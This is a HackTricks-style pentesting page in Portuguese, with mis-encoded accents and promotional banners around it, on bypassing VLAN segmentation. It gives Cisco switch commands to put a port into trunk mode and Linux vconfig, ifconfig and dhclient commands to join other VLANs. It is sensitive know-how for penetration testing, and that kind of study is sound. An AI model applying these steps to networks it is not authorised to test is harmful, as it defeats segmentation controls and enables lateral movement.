# Bypass de SegmentaÃ§Ã£o Lateral de VLAN

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* VocÃª trabalha em uma **empresa de ciberseguranÃ§a**? Gostaria de ver sua **empresa anunciada no HackTricks**? ou gostaria de ter acesso Ã  **Ãºltima versÃ£o do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A FamÃ­lia PEASS**](https://opensea.io/collection/the-peass-family), nossa coleÃ§Ã£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** ğŸ¦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o [repositÃ³rio hacktricks](https://github.com/carlospolop/hacktricks) e [repositÃ³rio hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

Se houver acesso direto a um switch, a segmentaÃ§Ã£o de VLAN pode ser contornada. Isso envolve reconfigurar a porta conectada para o modo trunk, estabelecer interfaces virtuais para as VLANs de destino e configurar endereÃ§os IP, seja de forma dinÃ¢mica (DHCP) ou estÃ¡tica, dependendo do cenÃ¡rio (**para mais detalhes, consulte [https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)).**

Inicialmente, Ã© necessÃ¡rio identificar a porta conectada especÃ­fica. Isso geralmente pode ser feito por meio de mensagens CDP ou procurando a porta via mÃ¡scara **include**.

**Se o CDP nÃ£o estiver operacional, a identificaÃ§Ã£o da porta pode ser tentada procurando pelo endereÃ§o MAC**:
```
SW1(config)# show mac address-table | include 0050.0000.0500
```
Antes de mudar para o modo trunk, uma lista das VLANs existentes deve ser compilada e seus identificadores determinados. Esses identificadores sÃ£o entÃ£o atribuÃ­dos Ã  interface, permitindo o acesso a vÃ¡rias VLANs atravÃ©s do trunk. A porta em uso, por exemplo, estÃ¡ associada Ã  VLAN 10.
```
SW1# show vlan brief
```
**A transiÃ§Ã£o para o modo trunk envolve entrar no modo de configuraÃ§Ã£o da interface**:
```
SW1(config)# interface GigabitEthernet 0/2
SW1(config-if)# switchport trunk encapsulation dot1q
SW1(config-if)# switchport mode trunk
```
Mudar para o modo trunk temporariamente interromperÃ¡ a conectividade, mas isso pode ser restaurado posteriormente.

As interfaces virtuais sÃ£o entÃ£o criadas, atribuÃ­das IDs de VLAN e ativadas:
```bash
sudo vconfig add eth0 10
sudo vconfig add eth0 20
sudo vconfig add eth0 50
sudo vconfig add eth0 60
sudo ifconfig eth0.10 up
sudo ifconfig eth0.20 up
sudo ifconfig eth0.50 up
sudo ifconfig eth0.60 up
```
Posteriormente, Ã© feita uma solicitaÃ§Ã£o de endereÃ§o via DHCP. Alternativamente, nos casos em que o DHCP nÃ£o Ã© viÃ¡vel, os endereÃ§os podem ser configurados manualmente:
```bash
sudo dhclient -v eth0.10
sudo dhclient -v eth0.20
sudo dhclient -v eth0.50
sudo dhclient -v eth0.60
```
Exemplo para configurar manualmente um endereÃ§o IP estÃ¡tico em uma interface (VLAN 10):
```bash
sudo ifconfig eth0.10 10.10.10.66 netmask 255.255.255.0
```
A conectividade Ã© testada iniciando solicitaÃ§Ãµes ICMP para os gateways padrÃ£o das VLANs 10, 20, 50 e 60.

No final, esse processo permite a bypassagem da segmentaÃ§Ã£o da VLAN, facilitando assim o acesso irrestrito a qualquer rede VLAN e preparando o terreno para aÃ§Ãµes subsequentes.

## ReferÃªncias

* [https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* VocÃª trabalha em uma **empresa de ciberseguranÃ§a**? Gostaria de ver sua **empresa anunciada no HackTricks**? ou gostaria de ter acesso Ã  **Ãºltima versÃ£o do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A FamÃ­lia PEASS**](https://opensea.io/collection/the-peass-family), nossa coleÃ§Ã£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** ğŸ¦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o [repositÃ³rio hacktricks](https://github.com/carlospolop/hacktricks) e [repositÃ³rio hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
